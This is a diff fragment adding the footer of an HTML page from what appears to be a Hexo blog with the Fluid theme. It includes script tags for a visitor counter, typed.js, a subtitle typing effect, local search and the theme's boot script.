+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
